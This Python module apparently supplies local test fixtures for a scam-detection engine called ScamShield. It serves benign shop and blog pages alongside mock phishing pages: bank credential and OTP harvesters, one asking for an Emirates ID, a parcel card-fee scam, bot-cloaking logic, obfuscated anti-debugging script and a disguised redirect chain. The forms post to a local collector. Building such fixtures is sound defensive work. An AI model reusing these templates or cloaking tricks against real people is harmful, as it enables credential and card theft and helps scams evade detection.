"""Local scam and benign sites for engine tests and the live demo.

Run `python -m tests.fixtures.server` and open http://localhost:8701/. Two listeners stand in for
two different hosts: the "site" (localhost:8701) and the "collector" (127.0.0.1:8702) that the
fake phishing pages send credentials to. Every brand here is invented ("Example Bank").
"""

from __future__ import annotations

import base64
import json
import os
import secrets
import threading
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlsplit

FAVICON = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAKElEQVR4nGNgGAWjYBSMglEwCkbBKBgFo2AUjIJRMApGwSgYBaNgFAwAACp8AAGx0QIuAAAAAElFTkSuQmCC"
)

STYLE = """<style>
body{font-family:system-ui,'Segoe UI',Tahoma,sans-serif;margin:0;background:#f4f6f8;color:#1d2731}
header{background:#0b4f6c;color:#fff;padding:14px 20px;font-size:20px}
main{max-width:520px;margin:24px auto;background:#fff;padding:24px;border-radius:10px}
label{display:block;margin-top:12px;font-size:14px}input,select{width:100%;padding:10px;margin-top:4px;box-sizing:border-box}
button{margin-top:18px;width:100%;padding:12px;background:#0b4f6c;color:#fff;border:0;border-radius:6px}
.item{border-bottom:1px solid #e2e6ea;padding:10px 0}.price{float:right;font-weight:600}
</style>"""


def page(title: str, body: str, *, lang: str = "en", head: str = "") -> str:
    direction = "rtl" if lang == "ar" else "ltr"
    return (
        f'<!doctype html><html lang="{lang}" dir="{direction}"><head><meta charset="utf-8">'
        f'<meta name="viewport" content="width=device-width,initial-scale=1"><title>{title}</title>'
        f'<link rel="icon" href="/favicon.ico">{STYLE}{head}</head><body>{body}</body></html>'
    )


def shop(lang: str) -> str:
    if lang == "ar":
        items = [("قهوة عربية مختصة ٢٥٠ غرام", "45 درهم"), ("تمر خلاص فاخر", "60 درهم"), ("دلة نحاسية تقليدية", "120 درهم")]
        body = (
            "<header>متجر الواحة</header><main><h1>منتجات مختارة</h1>"
            "<p>نوصل الطلبات داخل الإمارات خلال يومين عمل. الدفع عند الاستلام متاح لجميع الطلبات.</p>"
            + "".join(f'<div class="item">{n}<span class="price">{p}</span></div>' for n, p in items)
            + '<form action="/ar/search" method="get"><label for="q">ابحث في المتجر</label>'
            '<input id="q" name="q" type="search"><button>بحث</button></form>'
            '<p><a href="/ar/about">من نحن</a> · <a href="/ar/contact">تواصل معنا</a></p></main>'
        )
        return page("متجر الواحة - منتجات محلية", body, lang="ar")
    items = [("Single-origin coffee beans 250g", "AED 45"), ("Premium Khalas dates", "AED 60"), ("Copper dallah pot", "AED 120")]
    body = (
        "<header>Oasis Market</header><main><h1>Featured products</h1>"
        "<p>We deliver across the UAE within two working days. Cash on delivery is available on every order.</p>"
        + "".join(f'<div class="item">{n}<span class="price">{p}</span></div>' for n, p in items)
        + '<form action="/search" method="get"><label for="q">Search the shop</label>'
        '<input id="q" name="q" type="search"><button>Search</button></form>'
        '<p><a href="/about">About us</a> · <a href="/contact">Contact</a></p></main>'
    )
    return page("Oasis Market - local products", body)


def login(lang: str, collector: str) -> str:
    if lang == "ar":
        body = (
            "<header>بنك المثال</header><main><h1>تسجيل الدخول إلى الخدمات المصرفية</h1>"
            "<p>لحماية حسابك يرجى تأكيد بياناتك خلال ٢٤ ساعة وإلا سيتم إيقاف الحساب.</p>"
            f'<form action="{collector}/collect" method="post">'
            '<label for="u">اسم المستخدم</label><input id="u" name="u">'
            '<label for="p">كلمة المرور</label><input id="p" name="p" type="password">'
            '<label for="eid">رقم الهوية الإماراتية</label><input id="eid" name="eid" placeholder="784-XXXX-XXXXXXX-X">'
            '<label for="m">رقم الهاتف المتحرك</label><input id="m" name="m">'
            '<label for="c">رمز التحقق المرسل إليك</label><input id="c" name="c" inputmode="numeric" maxlength="6">'
            "<button>دخول</button></form></main>"
        )
        return page("بنك المثال - تسجيل الدخول", body, lang="ar")
    body = (
        "<header>Example Bank</header><main><h1>Sign in to Online Banking</h1>"
        "<p>Your account has been temporarily limited. Verify your details within 24 hours to avoid suspension.</p>"
        f'<form action="{collector}/collect" method="post">'
        '<label for="user">Username</label><input id="user" name="username" autocomplete="username">'
        '<label for="pass">Password</label><input id="pass" name="password" type="password">'
        '<label for="otp">One-time code sent by SMS</label><input id="otp" name="otp" autocomplete="one-time-code">'
        "<button>Sign in</button></form></main>"
    )
    return page("Example Bank - Sign in", body)


def card(collector: str) -> str:
    body = (
        "<header>Example Post</header><main><h1>Parcel on hold</h1>"
        "<p>A customs fee of AED 7.50 is due before we can deliver your parcel.</p>"
        f'<form action="{collector}/collect" method="post">'
        '<label>Name on card<input name="holder" autocomplete="cc-name"></label>'
        '<label>Card number<input name="ccnum" inputmode="numeric"></label>'
        '<label>Expiry (MM/YY)<input name="exp"></label>'
        '<label>CVV<input name="cvv" maxlength="4"></label>'
        "<button>Pay AED 7.50</button></form></main>"
    )
    return page("Example Post - Delivery fee", body)


def bank_home() -> str:
    """A legitimate bank's home page with its own sign-in box, protected by a bot wall."""
    body = (
        "<header>Example Bank</header><main><h1>Banking made simple</h1>"
        "<p>Open an account in minutes, manage your cards and pay bills from anywhere in the UAE.</p>"
        '<form action="/online-banking/login" method="post"><label for="id">Customer ID</label><input id="id" name="cid">'
        '<label for="pw">Password</label><input id="pw" name="pw" type="password"><button>Sign in</button></form></main>'
    )
    return page("Example Bank - Personal banking", body)


def blog() -> str:
    body = (
        "<header>Garden Notes</header><main><h1>Growing herbs on a balcony</h1>"
        "<p>Basil, mint and rosemary do well in pots if they get morning sun and are watered in the evening. "
        "Use a light soil mix and pinch off flower buds to keep the leaves tender through the summer.</p>"
        "<p>In the cooler months, move the pots closer to the wall to protect them from wind.</p></main>"
    )
    return page("Garden Notes", body)


# Obfuscator-style script: hex identifier table, rotated string array, encoded eval, anti-debugging.
SCRAMBLED_JS = """var _0x4a1b=['aW5uZXJIVE1M','Z2V0RWxlbWVudEJ5SWQ=','YXBw','PGgxPkV4YW1wbGU8L2gxPg=='];
(function(_0x2d8f05,_0x4b81bb){var _0x4d74cb=function(_0x32719f){while(--_0x32719f){_0x2d8f05['push'](_0x2d8f05['shift']());}};
_0x4d74cb(++_0x4b81bb);}(_0x4a1b,0x1f3));var _0x3c2e=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=_0x2d8f05-0x0;
var _0x4d74cb=_0x4a1b[_0x2d8f05];return atob(_0x4d74cb);};setInterval(function(){debugger;},0x7d0);
var _0x1f9a=document[_0x3c2e('0x1')](_0x3c2e('0x2'));eval(atob('dmFyIHg9MTs='));_0x1f9a[_0x3c2e('0x0')]=_0x3c2e('0x3');
"""

SPA_JS = """(function(){
  fetch("/api/page.json").then(function(r){return r.json();}).then(function(d){
    document.getElementById("root").textContent = d.headline;
  });
})();
"""

SPA_DATA = {
    "headline": "Weekend offers on home appliances",
    "sections": [
        {"title": "Kitchen", "body": "Save up to thirty percent on blenders, ovens and coffee machines this weekend only."},
        {"title": "Laundry", "body": "Free installation on every washing machine ordered before Sunday evening."},
        {"title": "Delivery", "body": "Same day delivery is available in Abu Dhabi and Dubai for orders placed before noon."},
    ],
}


def gated(collector: str) -> str:
    """Client-side cloaking: bots and crawlers get a blank page, people get an injected login form."""
    script = (
        "<script>if (navigator.webdriver || /bot|crawl|spider|headless/i.test(navigator.userAgent)) {"
        " document.getElementById('c').innerHTML = '<p>Nothing here.</p>'; } else {"
        f" document.getElementById('c').innerHTML = '<form action=\"{collector}/collect\" method=\"post\">' +"
        " '<label>Password</label><input type=\"password\" name=\"pw\">' + '<button>Continue</button></form>'; }"
        "\ndocument.addEventListener('contextmenu', function (e) { e.preventDefault(); });</script>"
    )
    return page("Account check", '<header>Example Bank</header><main id="c"></main>' + script)


def news() -> str:
    """The same article every time; only the clock, nonce, CSRF token and cache-buster change."""
    now = datetime.now(timezone.utc)
    nonce = secrets.token_hex(16)
    body = (
        f"<header>City Daily</header><main><p>Updated {now:%Y-%m-%d %H:%M:%S} UTC · request {nonce}</p>"
        "<h1>New cycling lanes open along the corniche</h1>"
        "<p>The municipality opened twelve kilometres of protected cycling lanes this morning, connecting the "
        "marina with the old harbour. Officials said the lanes will be lit at night and patrolled on weekends.</p>"
        "<p>Residents can rent bicycles from eight stations along the route using the city transport card.</p>"
        f'<form action="/subscribe" method="post"><input type="hidden" name="csrf_token" value="{secrets.token_urlsafe(24)}">'
        '<label for="e">Newsletter</label><input id="e" name="email" type="email"><button>Subscribe</button></form>'
        f'<p>Views today: {secrets.randbelow(90000) + 1000}</p></main>'
        f'<script src="/static/news.js?v={int(time.time() * 1000)}" nonce="{nonce}"></script>'
    )
    return page("City Daily - Cycling lanes", body)


@dataclass
class Sites:
    site: str
    collector: str


def make_handler(sites: Sites):
    class Handler(BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def log_message(self, *args) -> None:
            pass

        def send(self, status: int, body: str | bytes, ctype: str = "text/html; charset=utf-8", headers: dict | None = None) -> None:
            data = body.encode() if isinstance(body, str) else body
            self.send_response(status)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(data)))
            for key, value in (headers or {}).items():
                self.send_header(key, value)
            self.end_headers()
            self.wfile.write(data)

        def redirect(self, location: str, status: int = 302) -> None:
            self.send(status, "", headers={"Location": location})

        def looks_like_bot(self) -> bool:
            ua = self.headers.get("User-Agent", "")
            return "sec-ch-ua" not in self.headers or any(t in ua.lower() for t in ("bot", "python", "curl", "crawl"))

        def do_GET(self) -> None:
            path = urlsplit(self.path).path
            final = base64.b64encode(f"{sites.site}/login".encode()).decode()
            routes = {
                "/": lambda: self.send(200, index()),
                "/shop": lambda: self.send(200, shop("en")),
                "/ar/shop": lambda: self.send(200, shop("ar")),
                "/login": lambda: self.send(200, login("en", sites.collector)),
                "/ar/login": lambda: self.send(200, login("ar", sites.collector)),
                "/card": lambda: self.send(200, card(sites.collector)),
                "/blog": lambda: self.send(200, blog()),
                "/gate": lambda: self.send(200, gated(sites.collector)),
                "/news": lambda: self.send(200, news(), headers={"Set-Cookie": f"sid={secrets.token_hex(8)}; Path=/"}),
                "/shell": lambda: self.send(200, page("Loading", '<div id="app"></div><script src="/static/app.min.js"></script>')),
                "/spa": lambda: self.send(200, page("Deals", '<div id="root"></div><script src="/static/spa.js"></script>')),
                "/static/app.min.js": lambda: self.send(200, SCRAMBLED_JS, "application/javascript"),
                "/static/spa.js": lambda: self.send(200, SPA_JS, "application/javascript"),
                "/static/news.js": lambda: self.send(200, "document.title = document.title;", "application/javascript"),
                "/api/page.json": lambda: self.send(200, json.dumps(SPA_DATA), "application/json"),
                "/chain/start": lambda: self.redirect(f"{sites.site}/chain/meta"),
                "/chain/meta": lambda: self.send(200, page("Redirecting", "<p>Please wait</p>",
                                                         head=f'<meta http-equiv="refresh" content="0; url={sites.collector}/chain/js">')),
                "/chain/js": lambda: self.send(200, page("Loading", "<p>Loading</p>",
                                                       head=f'<script>var t = "{final}"; window.location.replace(atob(t));</script>')),
                "/cloak": lambda: self.send(200, blog() if self.looks_like_bot() or "?1" not in self.headers.get("sec-ch-ua-mobile", "")
                                            else login("en", sites.collector)),
                "/botwall": lambda: self.send(403, page("Access denied", "<p>Request blocked.</p>")) if self.looks_like_bot()
                else self.send(200, bank_home()),
                "/challenge": lambda: self.send(200, page("Just a moment...", "<p>Checking your browser.</p>",
                                                          head='<script src="/cdn-cgi/challenge-platform/h/b/orchestrate/jsch/v1"></script>'))
                if self.looks_like_bot() else self.send(200, bank_home()),
                "/loop": lambda: self.redirect(f"{sites.site}/loop"),
                "/download.zip": lambda: self.send(200, b"PK\x03\x04" + bytes(64), "application/zip"),
                "/big": lambda: self.send(200, page("Big", "<p>" + "filler text " * 400_000 + "</p>")),
                "/echo": lambda: self.send(200, json.dumps(dict(self.headers.items())), "application/json"),
                "/favicon.ico": lambda: self.send(200, FAVICON, "image/png"),
            }
            routes.get(path, lambda: self.send(404, page("Not found", "<p>Not found</p>")))()

        def do_POST(self) -> None:
            self.send(405, "")

    def index() -> str:
        links = "".join(
            f'<li><a href="{sites.site}{p}">{p}</a> {d}</li>'
            for p, d in [
                ("/shop", "benign shop"), ("/ar/shop", "benign shop (Arabic)"), ("/login", "credential harvester"),
                ("/ar/login", "credential harvester (Arabic, Emirates ID + OTP)"), ("/card", "card-fee scam"),
                ("/shell", "empty shell + scrambled script"), ("/spa", "content only via JSON API"),
                ("/chain/start", "302 → meta refresh → JS redirect"), ("/cloak", "server-side cloaking"),
                ("/gate", "client-side cloaking gate"), ("/news", "changes only clock / nonce"),
                ("/botwall", "legitimate bank behind a 403 bot wall"), ("/challenge", "bank behind a JS challenge"),
            ]
        )
        return page("ScamShield fixtures", f"<header>ScamShield test sites</header><main><ul>{links}</ul></main>")

    return Handler


def start(site_port: int = 0, collector_port: int = 0, host: str = "127.0.0.1") -> tuple[Sites, list[ThreadingHTTPServer]]:
    """Start both listeners in background threads; port 0 picks free ports."""
    servers = [ThreadingHTTPServer((host, site_port), BaseHTTPRequestHandler),
               ThreadingHTTPServer((host, collector_port), BaseHTTPRequestHandler)]
    sites = Sites(site=f"http://localhost:{servers[0].server_port}", collector=f"http://127.0.0.1:{servers[1].server_port}")
    for server in servers:
        server.RequestHandlerClass = make_handler(sites)
        server.daemon_threads = True
        threading.Thread(target=server.serve_forever, daemon=True).start()
    return sites, servers


def main() -> None:
    sites, servers = start(int(os.environ.get("FIXTURE_PORT", "8701")), int(os.environ.get("FIXTURE_COLLECTOR_PORT", "8702")))
    print(f"fixture sites on {sites.site}/ (collector {sites.collector}); set SCAMSHIELD_ALLOW_PRIVATE=1 to scan them")
    try:
        threading.Event().wait()
    except KeyboardInterrupt:
        for server in servers:
            server.shutdown()


if __name__ == "__main__":
    main()
